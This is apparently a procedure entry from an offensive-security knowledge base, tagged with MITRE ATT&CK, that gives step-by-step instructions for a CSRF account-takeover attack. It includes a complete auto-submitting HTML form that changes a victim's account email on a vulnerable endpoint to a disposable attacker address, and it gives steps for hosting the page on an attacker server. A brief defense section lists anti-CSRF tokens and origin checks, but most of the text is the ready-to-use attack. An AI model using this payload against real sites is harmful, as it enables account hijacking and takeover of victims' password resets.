---
tags:
  - csrf
  - payload-creation
type: procedure
tools:
  - '[[tools/tempmail]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:06.155Z'
sub_techniques: []
id: 3812996d-fc14-401b-9af0-dcf0bfc392f1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Setup-Malicious-CSRF-Page

## Summary

This procedure creates and hosts a malicious HTML page that auto-submits a form to exploit CSRF on the account update endpoint, changing the victim's details including email to an attacker-controlled address.

## Description

The target endpoint /registration/my-account.cfm lacks CSRF protection, allowing a forged POST from an external site. The HTML includes hidden inputs for form fields like txtEmail1 set to a temporary email from tempmail, and JavaScript to submit on load. Use history.pushState to keep the victim on the page. Host on an attacker-controlled server. Prerequisites: Access to a web hosting service and a temporary email generator.

## Requirements

1. Web server to host the HTML (e.g., local Python server or remote hosting)
2. Temporary email service like tempmail
3. Knowledge of target form fields from reconnaissance

## Defense

Defensive measures and detection strategies:

- Enforce anti-CSRF tokens (e.g., synchronizer tokens)
- Validate referer/header origins
- Log and alert on account changes from suspicious sources

## Objectives

1. Forge account update request
2. Redirect email to attacker control
3. Enable subsequent takeover steps

## Instructions

### Step 1: Generate Temporary Email

**Context**: Obtain a disposable email to receive future reset notifications.

Use [[tools/tempmail]] to create an email like voyan61996@jrvps.com.

> Copy the email address for form insertion.

### Step 2: Create HTML Payload

**Context**: Build the auto-submitting form targeting the vulnerable endpoint.

Create an HTML file:

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://target.com/registration/my-account.cfm" method="POST">
<input type="hidden" name="cmdSubmit" value="Update My Account">
<input type="hidden" name="txtFirstname" value="fname">
<input type="hidden" name="txtMI" value="hi">
<input type="hidden" name="txtLastname" value="lnames">
<input type="hidden" name="txtAddress" value="hello">
<input type="hidden" name="optAddress" value="temporary">
<input type="hidden" name="txtPhone" value="89">
<input type="hidden" name="txtEmail1" value="voyan61996@jrvps.com">
<input type="hidden" name="txtEmail2" value="voyan61996@jrvps.com">
<input type="hidden" name="txtPassword" value="">
<input type="hidden" name="txtPassword2" value="">
</form>
<script>document.forms[0].submit(); history.pushState({}, '', location.href);</script>
</body>
</html>
```

> Save as csrf.html and host it.

### Step 3: Host the Page

**Context**: Make the payload accessible via a URL.

Upload to a server; test by loading in browser to ensure auto-submit.

> URL ready, e.g., http://attacker-server.com/csrf.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/tempmail]]

## Tags

- [[csrf]]
- [[payload]]
